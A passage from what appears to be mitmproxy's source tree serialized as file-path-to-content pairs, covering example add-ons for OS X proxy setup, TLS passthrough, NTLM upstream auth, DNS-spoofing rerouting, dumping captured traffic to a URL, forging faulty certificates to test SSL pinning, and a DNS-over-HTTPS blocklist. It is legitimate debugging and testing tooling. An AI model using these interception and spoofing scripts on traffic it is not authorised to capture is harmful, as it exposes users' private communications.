self.enable_proxy_for_service(service_name)\n\n        yield\n\n        for service_name in connected_service_names:\n            if self.proxy_enabled_for_service(service_name):\n                self.disable_proxy_for_service(service_name)\n\n    @classmethod\n    def ensure_superuser(cls):\n        if os.getuid() != 0:\n            print(\"Relaunching with sudo...\")\n            os.execv(\"/usr/bin/sudo\", [\"/usr/bin/sudo\"] + sys.argv)\n\n    @classmethod\n    def main(cls):\n        parser = argparse.ArgumentParser(\n            description=\"Helper tool for OS X proxy configuration and mitmproxy.\",\n            epilog=\"Any additional arguments will be passed on unchanged to mitmproxy/mitmweb.\",\n        )\n        parser.add_argument(\n            \"-t\",\n            \"--toggle\",\n            action=\"store_true\",\n            help=\"just toggle the proxy configuration\",\n        )\n        # parser.add_argument('--honeyproxy', action='store_true', help='run honeyproxy instead of mitmproxy')\n        parser.add_argument(\n            \"-p\",\n            \"--port\",\n            type=int,\n            help=\"override the default port of 8080\",\n            default=8080,\n        )\n        parser.add_argument(\n            \"-P\",\n            \"--port-random\",\n            action=\"store_true\",\n            help=\"choose a random unused port\",\n        )\n        parser.add_argument(\n            \"-w\",\n            \"--web\",\n            action=\"store_true\",\n            help=\"web interface: run mitmweb instead of mitmproxy\",\n        )\n        args, extra_arguments = parser.parse_known_args()\n        port = args.port\n\n        # Allocate a random unused port, and hope no other process steals it before mitmproxy/mitmweb uses it.\n        # Passing the allocated socket to mitmproxy/mitmweb would be nicer of course.\n        if args.port_random:\n            with socketserver.TCPServer((\"localhost\", 0), None) as s:\n                port = s.server_address[1]\n                print(f\"Using random port {port}...\")\n\n        wrapper = cls(port=port, use_mitmweb=args.web, extra_arguments=extra_arguments)\n\n        def handler(signum, frame):\n            print(\"Cleaning up proxy settings...\")\n            wrapper.toggle_proxy()\n\n        signal.signal(signal.SIGINT, handler)\n\n        if args.toggle:\n            wrapper.toggle_proxy()\n        # elif args.honeyproxy:\n        #     wrapper.wrap_honeyproxy()\n        else:\n            wrapper.wrap_mitmproxy()\n\n\nif __name__ == \"__main__\":\n    Wrapper.ensure_superuser()\n    Wrapper.main()\n", "examples/contrib/link_expander.py": "# This script determines if request is an HTML webpage and if so seeks out\n# relative links (<a href=\"./about.html\">) and expands them to absolute links\n# In practice this can be used to front an indexing spider that may not have the capability to expand relative page links.\n# Usage: mitmdump -s link_expander.py or mitmproxy -s link_expander.py\nimport re\nfrom urllib.parse import urljoin\n\n\ndef response(flow):\n    if (\n        \"Content-Type\" in flow.response.headers\n        and flow.response.headers[\"Content-Type\"].find(\"text/html\") != -1\n    ):\n        pageUrl = flow.request.url\n        pageText = flow.response.text\n        pattern = (\n            r\"<a\\s+(?:[^>]*?\\s+)?href=(?P<delimiter>[\\\"'])\"\n            r\"(?P<link>(?!https?:\\/\\/|ftps?:\\/\\/|\\/\\/|#|javascript:|mailto:).*?)(?P=delimiter)\"\n        )\n        rel_matcher = re.compile(pattern, flags=re.IGNORECASE)\n        rel_matches = rel_matcher.finditer(pageText)\n        map_dict = {}\n        for match_num, match in enumerate(rel_matches):\n            (delimiter, rel_link) = match.group(\"delimiter\", \"link\")\n            abs_link = urljoin(pageUrl, rel_link)\n            map_dict[\"{0}{1}{0}\".format(delimiter, rel_link)] = \"{0}{1}{0}\".format(\n                delimiter, abs_link\n            )\n        for map in map_dict.items():\n            pageText = pageText.replace(*map)\n            # Uncomment the following to print the expansion mapping\n            # print(\"{0} -> {1}\".format(*map))\n        flow.response.text = pageText\n", "examples/contrib/tls_passthrough.py": "\"\"\"\nThis addon allows conditional TLS Interception based on a user-defined strategy.\n\nExample:\n\n    > mitmdump -s tls_passthrough.py\n\n    1. curl --proxy http://localhost:8080 https://example.com --insecure\n    // works - we'll also see the contents in mitmproxy\n\n    2. curl --proxy http://localhost:8080 https://example.com\n    // fails with a certificate error, which we will also see in mitmproxy\n\n    3. curl --proxy http://localhost:8080 https://example.com\n    // works again, but mitmproxy does not intercept and we do *not* see the contents\n\"\"\"\n\nimport collections\nimport logging\nimport random\nfrom abc import ABC\nfrom abc import abstractmethod\nfrom enum import Enum\n\nfrom mitmproxy import connection\nfrom mitmproxy import ctx\nfrom mitmproxy import tls\nfrom mitmproxy.addonmanager import Loader\nfrom mitmproxy.utils import human\n\n\nclass InterceptionResult(Enum):\n    SUCCESS = 1\n    FAILURE = 2\n    SKIPPED = 3\n\n\nclass TlsStrategy(ABC):\n    def __init__(self):\n        # A server_address -> interception results mapping\n        self.history = collections.defaultdict(lambda: collections.deque(maxlen=200))\n\n    @abstractmethod\n    def should_intercept(self, server_address: connection.Address) -> bool:\n        raise NotImplementedError()\n\n    def record_success(self, server_address):\n        self.history[server_address].append(InterceptionResult.SUCCESS)\n\n    def record_failure(self, server_address):\n        self.history[server_address].append(InterceptionResult.FAILURE)\n\n    def record_skipped(self, server_address):\n        self.history[server_address].append(InterceptionResult.SKIPPED)\n\n\nclass ConservativeStrategy(TlsStrategy):\n    \"\"\"\n    Conservative Interception Strategy - only intercept if there haven't been any failed attempts\n    in the history.\n    \"\"\"\n\n    def should_intercept(self, server_address: connection.Address) -> bool:\n        return InterceptionResult.FAILURE not in self.history[server_address]\n\n\nclass ProbabilisticStrategy(TlsStrategy):\n    \"\"\"\n    Fixed probability that we intercept a given connection.\n    \"\"\"\n\n    def __init__(self, p: float):\n        self.p = p\n        super().__init__()\n\n    def should_intercept(self, server_address: connection.Address) -> bool:\n        return random.uniform(0, 1) < self.p\n\n\nclass MaybeTls:\n    strategy: TlsStrategy\n\n    def load(self, loader: Loader):\n        loader.add_option(\n            \"tls_strategy\",\n            int,\n            0,\n            \"TLS passthrough strategy. If set to 0, connections will be passed through after the first unsuccessful \"\n            \"handshake. If set to 0 < p <= 100, connections with be passed through with probability p.\",\n        )\n\n    def configure(self, updated):\n        if \"tls_strategy\" not in updated:\n            return\n        if ctx.options.tls_strategy > 0:\n            self.strategy = ProbabilisticStrategy(ctx.options.tls_strategy / 100)\n        else:\n            self.strategy = ConservativeStrategy()\n\n    @staticmethod\n    def get_addr(server: connection.Server):\n        # .peername may be unset in upstream proxy mode, so we need a fallback.\n        return server.peername or server.address\n\n    def tls_clienthello(self, data: tls.ClientHelloData):\n        server_address = self.get_addr(data.context.server)\n        if not self.strategy.should_intercept(server_address):\n            logging.info(f\"TLS passthrough: {human.format_address(server_address)}.\")\n            data.ignore_connection = True\n            self.strategy.record_skipped(server_address)\n\n    def tls_established_client(self, data: tls.TlsData):\n        server_address = self.get_addr(data.context.server)\n        logging.info(\n            f\"TLS handshake successful: {human.format_address(server_address)}\"\n        )\n        self.strategy.record_success(server_address)\n\n    def tls_failed_client(self, data: tls.TlsData):\n        server_address = self.get_addr(data.context.server)\n        logging.info(f\"TLS handshake failed: {human.format_address(server_address)}\")\n        self.strategy.record_failure(server_address)\n\n\naddons = [MaybeTls()]\n", "examples/contrib/ntlm_upstream_proxy.py": "import base64\nimport binascii\nimport logging\nimport socket\nfrom typing import Any\nfrom typing import Optional\n\nfrom ntlm_auth import gss_channel_bindings\nfrom ntlm_auth import ntlm\n\nfrom mitmproxy import addonmanager\nfrom mitmproxy import ctx\nfrom mitmproxy import http\nfrom mitmproxy.net.http import http1\nfrom mitmproxy.proxy import commands\nfrom mitmproxy.proxy import layer\nfrom mitmproxy.proxy.context import Context\nfrom mitmproxy.proxy.layers.http import HttpConnectUpstreamHook\nfrom mitmproxy.proxy.layers.http import HttpLayer\nfrom mitmproxy.proxy.layers.http import HttpStream\nfrom mitmproxy.proxy.layers.http._upstream_proxy import HttpUpstreamProxy\n\n\nclass NTLMUpstreamAuth:\n    \"\"\"\n    This addon handles authentication to systems upstream from us for the\n    upstream proxy and reverse proxy mode. There are 3 cases:\n    - Upstream proxy CONNECT requests should have authentication added, and\n      subsequent already connected requests should not.\n    - Upstream proxy regular requests\n    - Reverse proxy regular requests (CONNECT is invalid in this mode)\n    \"\"\"\n\n    def load(self, loader: addonmanager.Loader) -> None:\n        logging.info(\"NTLMUpstreamAuth loader\")\n        loader.add_option(\n            name=\"upstream_ntlm_auth\",\n            typespec=Optional[str],\n            default=None,\n            help=\"\"\"\n            Add HTTP NTLM authentication to upstream proxy requests.\n            Format: username:password.\n            \"\"\",\n        )\n        loader.add_option(\n            name=\"upstream_ntlm_domain\",\n            typespec=Optional[str],\n            default=None,\n            help=\"\"\"\n            Add HTTP NTLM domain for authentication to upstream proxy requests.\n            \"\"\",\n        )\n        loader.add_option(\n            name=\"upstream_proxy_address\",\n            typespec=Optional[str],\n            default=None,\n            help=\"\"\"\n                upstream poxy address.\n                \"\"\",\n        )\n        loader.add_option(\n            name=\"upstream_ntlm_compatibility\",\n            typespec=int,\n            default=3,\n            help=\"\"\"\n            Add HTTP NTLM compatibility for authentication to upstream proxy requests.\n            Valid values are 0-5 (Default: 3)\n            \"\"\",\n        )\n        logging.debug(\"AddOn: NTLM Upstream Authentication - Loaded\")\n\n    def running(self):\n        def extract_flow_from_context(context: Context) -> http.HTTPFlow:\n            if context and context.layers:\n                for x in context.layers:\n                    if isinstance(x, HttpLayer):\n                        for _, stream in x.streams.items():\n                            return (\n                                stream.flow if isinstance(stream, HttpStream) else None\n                            )\n\n        def build_connect_flow(\n            context: Context, connect_header: tuple\n        ) -> http.HTTPFlow:\n            flow = extract_flow_from_context(context)\n            if not flow:\n                logging.error(\"failed to build connect flow\")\n                raise\n            flow.request.content = b\"\"  # we should send empty content for handshake\n            header_name, header_value = connect_header\n            flow.request.headers.add(header_name, header_value)\n            return flow\n\n        def patched_start_handshake(self) -> layer.CommandGenerator[None]:\n            assert self.conn.address\n            self.ntlm_context = CustomNTLMContext(ctx)\n            proxy_authorization = self.ntlm_context.get_ntlm_start_negotiate_message()\n            self.flow = build_connect_flow(\n                self.context, (\"Proxy-Authorization\", proxy_authorization)\n            )\n            yield HttpConnectUpstreamHook(self.flow)\n            raw = http1.assemble_request(self.flow.request)\n            yield commands.SendData(self.tunnel_connection, raw)\n\n        def extract_proxy_authenticate_msg(response_head: list) -> str:\n            for header in response_head:\n                if b\"Proxy-Authenticate\" in header:\n                    challenge_message = str(bytes(header).decode(\"utf-8\"))\n                    try:\n                        token = challenge_message.split(\": \")[1]\n                    except IndexError:\n                        logging.error(\"Failed to extract challenge_message\")\n                        raise\n                    return token\n\n        def patched_receive_handshake_data(\n            self, data\n        ) -> layer.CommandGenerator[tuple[bool, str | None]]:\n            self.buf += data\n            response_head = self.buf.maybe_extract_lines()\n            if response_head:\n                response_head = [bytes(x) for x in response_head]\n                try:\n                    response = http1.read_response_head(response_head)\n                except ValueError:\n                    return True, None\n                challenge_message = extract_proxy_authenticate_msg(response_head)\n                if 200 <= response.status_code < 300:\n                    if self.buf:\n                        yield from self.receive_data(data)\n                        del self.buf\n                    return True, None\n                else:\n                    if not challenge_message:\n                        return True, None\n                    proxy_authorization = (\n                        self.ntlm_context.get_ntlm_challenge_response_message(\n                            challenge_message\n                        )\n                    )\n                    self.flow = build_connect_flow(\n                        self.context, (\"Proxy-Authorization\", proxy_authorization)\n                    )\n                    raw = http1.assemble_request(self.flow.request)\n                    yield commands.SendData(self.tunnel_connection, raw)\n                    return False, None\n            else:\n                return False, None\n\n        HttpUpstreamProxy.start_handshake = patched_start_handshake\n        HttpUpstreamProxy.receive_handshake_data = patched_receive_handshake_data\n\n    def done(self):\n        logging.info(\"close ntlm session\")\n\n\naddons = [NTLMUpstreamAuth()]\n\n\nclass CustomNTLMContext:\n    def __init__(\n        self,\n        ctx,\n        preferred_type: str = \"NTLM\",\n        cbt_data: gss_channel_bindings.GssChannelBindingsStruct = None,\n    ):\n        # TODO:// take care the cbt_data\n        auth: str = ctx.options.upstream_ntlm_auth\n        domain: str = str(ctx.options.upstream_ntlm_domain).upper()\n        ntlm_compatibility: int = ctx.options.upstream_ntlm_compatibility\n        username, password = tuple(auth.split(\":\"))\n        workstation = socket.gethostname().upper()\n        logging.debug(f'\\nntlm context with the details: \"{domain}\\\\{username}\", *****')\n        self.preferred_type = preferred_type\n        self.ntlm_context = ntlm.NtlmContext(\n            username=username,\n            password=password,\n            domain=domain,\n            workstation=workstation,\n            ntlm_compatibility=ntlm_compatibility,\n            cbt_data=cbt_data,\n        )\n\n    def get_ntlm_start_negotiate_message(self) -> str:\n        negotiate_message = self.ntlm_context.step()\n        negotiate_message_base_64_in_bytes = base64.b64encode(negotiate_message)\n        negotiate_message_base_64_ascii = negotiate_message_base_64_in_bytes.decode(\n            \"ascii\"\n        )\n        negotiate_message_base_64_final = (\n            f\"{self.preferred_type} {negotiate_message_base_64_ascii}\"\n        )\n        logging.debug(\n            f\"{self.preferred_type} Authentication, negotiate message: {negotiate_message_base_64_final}\"\n        )\n        return negotiate_message_base_64_final\n\n    def get_ntlm_challenge_response_message(self, challenge_message: str) -> Any:\n        challenge_message = challenge_message.replace(self.preferred_type + \" \", \"\", 1)\n        try:\n            challenge_message_ascii_bytes = base64.b64decode(\n                challenge_message, validate=True\n            )\n        except binascii.Error as err:\n            logging.debug(\n                f\"{self.preferred_type} Authentication fail with error {err.__str__()}\"\n            )\n            return False\n        authenticate_message = self.ntlm_context.step(challenge_message_ascii_bytes)\n        negotiate_message_base_64 = \"{} {}\".format(\n            self.preferred_type, base64.b64encode(authenticate_message).decode(\"ascii\")\n        )\n        logging.debug(\n            f\"{self.preferred_type} Authentication, response to challenge message: {negotiate_message_base_64}\"\n        )\n        return negotiate_message_base_64\n", "examples/contrib/search.py": "import logging\nimport re\nfrom collections.abc import Sequence\nfrom json import dumps\n\nfrom mitmproxy import command\nfrom mitmproxy import flow\n\nMARKER = \":mag:\"\nRESULTS_STR = \"Search Results: \"\n\n\nclass Search:\n    def __init__(self):\n        self.exp = None\n\n    @command.command(\"search\")\n    def _search(self, flows: Sequence[flow.Flow], regex: str) -> None:\n        \"\"\"\n        Defines a command named \"search\" that matches\n        the given regular expression against most parts\n        of each request/response included in the selected flows.\n\n        Usage: from the flow list view, type \":search\" followed by\n        a space, then a flow selection expression; e.g., \"@shown\",\n        then the desired regular expression to perform the search.\n\n        Alternatively, define a custom shortcut in keys.yaml; e.g.:\n        -\n          key: \"/\"\n          ctx: [\"flowlist\"]\n          cmd: \"console.command search @shown \"\n\n        Flows containing matches to the expression will be marked\n        with the magnifying glass emoji, and their comments will\n        contain JSON-formatted search results.\n\n        To view flow comments, enter the flow view\n        and navigate to the detail tab.\n        \"\"\"\n\n        try:\n            self.exp = re.compile(regex)\n        except re.error as e:\n            logging.error(e)\n            return\n\n        for _flow in flows:\n            # Erase previous results while preserving other comments:\n            comments = list()\n            for c in _flow.comment.split(\"\\n\"):\n                if c.startswith(RESULTS_STR):\n                    break\n                comments.append(c)\n            _flow.comment = \"\\n\".join(comments)\n\n            if _flow.marked == MARKER:\n                _flow.marked = False\n\n            results = {k: v for k, v in self.flow_results(_flow).items() if v}\n            if results:\n                comments.append(RESULTS_STR)\n                comments.append(dumps(results, indent=2))\n                _flow.comment = \"\\n\".join(comments)\n                _flow.marked = MARKER\n\n    def header_results(self, message):\n        results = {k: self.exp.findall(v) for k, v in message.headers.items()}\n        return {k: v for k, v in results.items() if v}\n\n    def flow_results(self, _flow):\n        results = dict()\n        results.update({\"flow_comment\": self.exp.findall(_flow.comment)})\n        if _flow.request is not None:\n            results.update({\"request_path\": self.exp.findall(_flow.request.path)})\n            results.update({\"request_headers\": self.header_results(_flow.request)})\n            if _flow.request.text:\n                results.update({\"request_body\": self.exp.findall(_flow.request.text)})\n        if _flow.response is not None:\n            results.update({\"response_headers\": self.header_results(_flow.response)})\n            if _flow.response.text:\n                results.update({\"response_body\": self.exp.findall(_flow.response.text)})\n        return results\n\n\naddons = [Search()]\n", "examples/contrib/remote-debug.py": "\"\"\"\nThis script enables remote debugging of the mitmproxy console *UI* with PyCharm.\nFor general debugging purposes, it is easier to just debug mitmdump within PyCharm.\n\nUsage:\n    - pip install pydevd on the mitmproxy machine\n    - Open the Run/Debug Configuration dialog box in PyCharm, and select the\n      Python Remote Debug configuration type.\n    - Debugging works in the way that mitmproxy connects to the debug server\n      on startup. Specify host and port that mitmproxy can use to reach your\n      PyCharm instance on startup.\n    - Adjust this inline script accordingly.\n    - Start debug server in PyCharm\n    - Set breakpoints\n    - Start mitmproxy -s remote_debug.py\n\"\"\"\n\n\ndef load(_):\n    import pydevd_pycharm\n\n    pydevd_pycharm.settrace(\n        \"localhost\", port=5678, stdoutToServer=True, stderrToServer=True, suspend=False\n    )\n", "examples/contrib/dns_spoofing.py": "\"\"\"\nThis script makes it possible to use mitmproxy in scenarios where IP spoofing\nhas been used to redirect connections to mitmproxy. The way this works is that\nwe rely on either the TLS Server Name Indication (SNI) or the Host header of the\nHTTP request. Of course, this is not foolproof - if an HTTPS connection comes\nwithout SNI, we don't know the actual target and cannot construct a certificate\nthat looks valid. Similarly, if there's no Host header or a spoofed Host header,\nwe're out of luck as well. Using transparent mode is the better option most of\nthe time.\n\nUsage:\n    mitmproxy\n        -p 443\n        -s dns_spoofing.py\n        # Used as the target location if neither SNI nor host header are present.\n        --mode reverse:http://example.com/\n        # To avoid auto rewriting of host header by the reverse proxy target.\n        --set keep_host_header\n    mitmdump\n        -p 80\n        --mode reverse:http://localhost:443/\n\n    (Setting up a single proxy instance and using iptables to redirect to it\n    works as well)\n\"\"\"\n\nimport re\n\n# This regex extracts splits the host header into host and port.\n# Handles the edge case of IPv6 addresses containing colons.\n# https://bugzilla.mozilla.org/show_bug.cgi?id=45891\nparse_host_header = re.compile(r\"^(?P<host>[^:]+|\\[.+\\])(?::(?P<port>\\d+))?$\")\n\n\nclass Rerouter:\n    def request(self, flow):\n        if flow.client_conn.tls_established:\n            flow.request.scheme = \"https\"\n            sni = flow.client_conn.sni\n            port = 443\n        else:\n            flow.request.scheme = \"http\"\n            sni = None\n            port = 80\n\n        host_header = flow.request.host_header\n        m = parse_host_header.match(host_header)\n        if m:\n            host_header = m.group(\"host\").strip(\"[]\")\n            if m.group(\"port\"):\n                port = int(m.group(\"port\"))\n\n        flow.request.host_header = host_header\n        flow.request.host = sni or host_header\n        flow.request.port = port\n\n\naddons = [Rerouter()]\n", "examples/contrib/jsondump.py": "\"\"\"\nThis script serializes the entire traffic dump, including websocket traffic,\nas JSON, and either sends it to a URL or writes to a file. The serialization\nformat is optimized for Elasticsearch; the script can be used to send all\ncaptured traffic to Elasticsearch directly.\n\nUsage:\n\n    mitmproxy\n        --mode reverse:http://example.com/\n        -s examples/complex/jsondump.py\n\nConfiguration:\n\n    Send to a URL:\n\n        cat > ~/.mitmproxy/config.yaml <<EOF\n        dump_destination: \"https://elastic.search.local/my-index/my-type\"\n        # Optional Basic auth:\n        dump_username: \"never-gonna-give-you-up\"\n        dump_password: \"never-gonna-let-you-down\"\n        # Optional base64 encoding of content fields\n        # to store as binary fields in Elasticsearch:\n        dump_encodecontent: true\n        EOF\n\n    Dump to a local file:\n\n        cat > ~/.mitmproxy/config.yaml <<EOF\n        dump_destination: \"/user/rastley/output.log\"\n        EOF\n\"\"\"\n\nimport base64\nimport json\nimport logging\nfrom queue import Queue\nfrom threading import Lock\nfrom threading import Thread\n\nimport requests\n\nfrom mitmproxy import ctx\n\nFILE_WORKERS = 1\nHTTP_WORKERS = 10\n\n\nclass JSONDumper:\n    \"\"\"\n    JSONDumper performs JSON serialization and some extra processing\n    for out-of-the-box Elasticsearch support, and then either writes\n    the result to a file or sends it to a URL.\n    \"\"\"\n\n    def __init__(self):\n        self.outfile = None\n        self.transformations = None\n        self.encode = None\n        self.url = None\n        self.lock = None\n        self.auth = None\n        self.queue = Queue()\n\n    def done(self):\n        self.queue.join()\n        if self.outfile:\n            self.outfile.close()\n\n    fields = {\n        \"timestamp\": (\n            (\"error\", \"timestamp\"),\n            (\"request\", \"timestamp_start\"),\n            (\"request\", \"timestamp_end\"),\n            (\"response\", \"timestamp_start\"),\n            (\"response\", \"timestamp_end\"),\n            (\"client_conn\", \"timestamp_start\"),\n            (\"client_conn\", \"timestamp_end\"),\n            (\"client_conn\", \"timestamp_tls_setup\"),\n            (\"server_conn\", \"timestamp_start\"),\n            (\"server_conn\", \"timestamp_end\"),\n            (\"server_conn\", \"timestamp_tls_setup\"),\n            (\"server_conn\", \"timestamp_tcp_setup\"),\n        ),\n        \"ip\": (\n            (\"server_conn\", \"source_address\"),\n            (\"server_conn\", \"ip_address\"),\n            (\"server_conn\", \"address\"),\n            (\"client_conn\", \"address\"),\n        ),\n        \"ws_messages\": ((\"messages\",),),\n        \"headers\": (\n            (\"request\", \"headers\"),\n            (\"response\", \"headers\"),\n        ),\n        \"content\": (\n            (\"request\", \"content\"),\n            (\"response\", \"content\"),\n        ),\n    }\n\n    def _init_transformations(self):\n        self.transformations = [\n            {\n                \"fields\": self.fields[\"headers\"],\n                \"func\": dict,\n            },\n            {\n                \"fields\": self.fields[\"timestamp\"],\n                \"func\": lambda t: int(t * 1000),\n            },\n            {\n                \"fields\": self.fields[\"ip\"],\n                \"func\": lambda addr: {\n                    \"host\": addr[0].replace(\"::ffff:\", \"\"),\n                    \"port\": addr[1],\n                },\n            },\n            {\n                \"fields\": self.fields[\"ws_messages\"],\n                \"func\": lambda ms: [\n                    {\n                        \"type\": m[0],\n                        \"from_client\": m[1],\n                        \"content\": base64.b64encode(bytes(m[2], \"utf-8\"))\n                        if self.encode\n                        else m[2],\n                        \"timestamp\": int(m[3] * 1000),\n                    }\n                    for m in ms\n                ],\n            },\n        ]\n\n        if self.encode:\n            self.transformations.append(\n                {\n                    \"fields\": self.fields[\"content\"],\n                    \"func\": base64.b64encode,\n                }\n            )\n\n    @staticmethod\n    def transform_field(obj, path, func):\n        \"\"\"\n        Apply a transformation function `func` to a value\n        under the specified `path` in the `obj` dictionary.\n        \"\"\"\n        for key in path[:-1]:\n            if not (key in obj and obj[key]):\n                return\n            obj = obj[key]\n        if path[-1] in obj and obj[path[-1]]:\n            obj[path[-1]] = func(obj[path[-1]])\n\n    @classmethod\n    def convert_to_strings(cls, obj):\n        \"\"\"\n        Recursively convert all list/dict elements of type `bytes` into strings.\n        \"\"\"\n        if isinstance(obj, dict):\n            return {\n                cls.convert_to_strings(key): cls.convert_to_strings(value)\n                for key, value in obj.items()\n            }\n        elif isinstance(obj, list) or isinstance(obj, tuple):\n            return [cls.convert_to_strings(element) for element in obj]\n        elif isinstance(obj, bytes):\n            return str(obj)[2:-1]\n        return obj\n\n    def worker(self):\n        while True:\n            frame = self.queue.get()\n            self.dump(frame)\n            self.queue.task_done()\n\n    def dump(self, frame):\n        \"\"\"\n        Transform and dump (write / send) a data frame.\n        \"\"\"\n        for tfm in self.transformations:\n            for field in tfm[\"fields\"]:\n                self.transform_field(frame, field, tfm[\"func\"])\n        frame = self.convert_to_strings(frame)\n\n        if self.outfile:\n            self.lock.acquire()\n            self.outfile.write(json.dumps(frame) + \"\\n\")\n            self.lock.release()\n        else:\n            requests.post(self.url, json=frame, auth=(self.auth or None))\n\n    @staticmethod\n    def load(loader):\n        \"\"\"\n        Extra options to be specified in `~/.mitmproxy/config.yaml`.\n        \"\"\"\n        loader.add_option(\n            \"dump_encodecontent\", bool, False, \"Encode content as base64.\"\n        )\n        loader.add_option(\n            \"dump_destination\",\n            str,\n            \"jsondump.out\",\n            \"Output destination: path to a file or URL.\",\n        )\n        loader.add_option(\n            \"dump_username\", str, \"\", \"Basic auth username for URL destinations.\"\n        )\n        loader.add_option(\n            \"dump_password\", str, \"\", \"Basic auth password for URL destinations.\"\n        )\n\n    def configure(self, _):\n        \"\"\"\n        Determine the destination type and path, initialize the output\n        transformation rules.\n        \"\"\"\n        self.encode = ctx.options.dump_encodecontent\n\n        if ctx.options.dump_destination.startswith(\"http\"):\n            self.outfile = None\n            self.url = ctx.options.dump_destination\n            logging.info(\"Sending all data frames to %s\" % self.url)\n            if ctx.options.dump_username and ctx.options.dump_password:\n                self.auth = (ctx.options.dump_username, ctx.options.dump_password)\n                logging.info(\"HTTP Basic auth enabled.\")\n        else:\n            self.outfile = open(ctx.options.dump_destination, \"a\")\n            self.url = None\n            self.lock = Lock()\n            logging.info(\"Writing all data frames to %s\" % ctx.options.dump_destination)\n\n        self._init_transformations()\n\n        for i in range(FILE_WORKERS if self.outfile else HTTP_WORKERS):\n            t = Thread(target=self.worker)\n            t.daemon = True\n            t.start()\n\n    def response(self, flow):\n        \"\"\"\n        Dump request/response pairs.\n        \"\"\"\n        self.queue.put(flow.get_state())\n\n    def error(self, flow):\n        \"\"\"\n        Dump errors.\n        \"\"\"\n        self.queue.put(flow.get_state())\n\n    def websocket_end(self, flow):\n        \"\"\"\n        Dump websocket messages once the connection ends.\n\n        Alternatively, you can replace `websocket_end` with\n        `websocket_message` if you want the messages to be\n        dumped one at a time with full metadata. Warning:\n        this takes up _a lot_ of space.\n        \"\"\"\n        self.queue.put(flow.get_state())\n\n\naddons = [JSONDumper()]  # pylint: disable=invalid-name\n", "examples/contrib/check_ssl_pinning.py": "import ipaddress\nimport time\n\nimport OpenSSL\n\nimport mitmproxy\nfrom mitmproxy import ctx\nfrom mitmproxy.certs import Cert\n\n# Certificate for client connection is generated in dummy_cert() in certs.py. Monkeypatching\n# the function to generate test cases for SSL Pinning.\n\n\ndef monkey_dummy_cert(privkey, cacert, commonname, sans):\n    ss = []\n    for i in sans:\n        try:\n            ipaddress.ip_address(i.decode(\"ascii\"))\n        except ValueError:\n            # Change values in Certificate's Alt Name as well.\n            if ctx.options.certwrongCN:\n                ss.append(b\"DNS:%sm\" % i)\n            else:\n                ss.append(b\"DNS:%s\" % i)\n        else:\n            ss.append(b\"IP:%s\" % i)\n    ss = b\", \".join(ss)\n\n    cert = OpenSSL.crypto.X509()\n    if ctx.options.certbeginon:\n        # Set certificate start time somewhere in the future\n        cert.gmtime_adj_notBefore(3600 * 48)\n    else:\n        cert.gmtime_adj_notBefore(-3600 * 48)\n\n    if ctx.options.certexpire:\n        # sets the expire date of the certificate in the past.\n        cert.gmtime_adj_notAfter(-3600 * 24)\n    else:\n        cert.gmtime_adj_notAfter(94608000)  # = 24 * 60 * 60 * 365 * 3\n\n    cert.set_issuer(cacert.get_subject())\n    if commonname is not None and len(commonname) < 64:\n        if ctx.options.certwrongCN:\n            # append an extra char to make certs common name different than original one.\n            # APpending a char in the end of the domain name.\n            new_cn = commonname + b\"m\"\n            cert.get_subject().CN = new_cn\n\n        else:\n            cert.get_subject().CN = commonname\n\n    cert.set_serial_number(int(time.time() * 10000))\n    if ss:\n        cert.set_version(2)\n        cert.add_extensions(\n            [OpenSSL.crypto.X509Extension(b\"subjectAltName\", False, ss)]\n        )\n        cert.set_pubkey(cacert.get_pubkey())\n        cert.sign(privkey, \"sha256\")\n        return Cert(cert)\n\n\nclass CheckSSLPinning:\n    def load(self, loader):\n        loader.add_option(\n            \"certbeginon\",\n            bool,\n            False,\n            \"\"\"\n            Sets SSL Certificate's 'Begins On' time in future.\n            \"\"\",\n        )\n        loader.add_option(\n            \"certexpire\",\n            bool,\n            False,\n            \"\"\"\n            Sets SSL Certificate's 'Expires On' time in the past.\n            \"\"\",\n        )\n\n        loader.add_option(\n            \"certwrongCN\",\n            bool,\n            False,\n            \"\"\"\n            Sets SSL Certificate's CommonName(CN) different from the domain name.\n            \"\"\",\n        )\n\n    def clientconnect(self, layer):\n        mitmproxy.certs.dummy_cert = monkey_dummy_cert\n", "examples/contrib/block_dns_over_https.py": "\"\"\"\nThis module is for blocking DNS over HTTPS requests.\n\nIt loads a blocklist of IPs and hostnames that are known to serve DNS over HTTPS requests.\nIt also uses headers, query params, and paths to detect DoH (and block it)\n\"\"\"\n\nimport logging\n\n# known DoH providers' hostnames and IP addresses to block\ndefault_blocklist: dict = {\n    \"hostnames\": [\n        \"dns.adguard.com\",\n        \"dns-family.adguard.com\",\n        \"dns.google\",\n        \"cloudflare-dns.com\",\n        \"mozilla.cloudflare-dns.com\",\n        \"security.cloudflare-dns.com\",\n        \"family.cloudflare-dns.com\",\n        \"dns.quad9.net\",\n        \"dns9.quad9.net\",\n        \"dns10.quad9.net\",\n        \"dns11.quad9.net\",\n        \"doh.opendns.com\",\n        \"doh.familyshield.opendns.com\",\n        \"doh.cleanbrowsing.org\",\n        \"doh.xfinity.com\",\n        \"dohdot.coxlab.net\",\n        \"odvr.nic.cz\",\n        \"doh.dnslify.com\",\n        \"dns.nextdns.io\",\n        \"dns.dnsoverhttps.net\",\n        \"doh.crypto.sx\",\n        \"doh.powerdns.org\",\n        \"doh-fi.blahdns.com\",\n        \"doh-jp.blahdns.com\",\n        \"doh-de.blahdns.com\",\n        \"doh.ffmuc.net\",\n        \"dns.dns-over-https.com\",\n        \"doh.securedns.eu\",\n        \"dns.rubyfish.cn\",\n        \"dns.containerpi.com\",\n        \"dns.containerpi.com\",\n        \"dns.containerpi.com\",\n        \"doh-2.seby.io\",\n        \"doh.seby.io\",\n        \"commons.host\",\n        \"doh.dnswarden.com\",\n        \"doh.dnswarden.com\",\n        \"doh.dnswarden.com\",\n        \"dns-nyc.aaflalo.me\",\n        \"dns.aaflalo.me\",\n        \"doh.applied-privacy.net\",\n        \"doh.captnemo.in\",\n        \"doh.tiar.app\",\n        \"doh.tiarap.org\",\n        \"doh.dns.sb\",\n        \"rdns.faelix.net\",\n        \"doh.li\",\n        \"doh.armadillodns.net\",\n        \"jp.tiar.app\",\n        \"jp.tiarap.org\",\n        \"doh.42l.fr\",\n        \"dns.hostux.net\",\n        \"dns.hostux.net\",\n        \"dns.aa.net.uk\",\n        \"adblock.mydns.network\",\n        \"ibksturm.synology.me\",\n        \"jcdns.fun\",\n        \"ibuki.cgnat.net\",\n        \"dns.twnic.tw\",\n        \"example.doh.blockerdns.com\",\n        \"dns.digitale-gesellschaft.ch\",\n        \"doh.libredns.gr\",\n        \"doh.centraleu.pi-dns.com\",\n        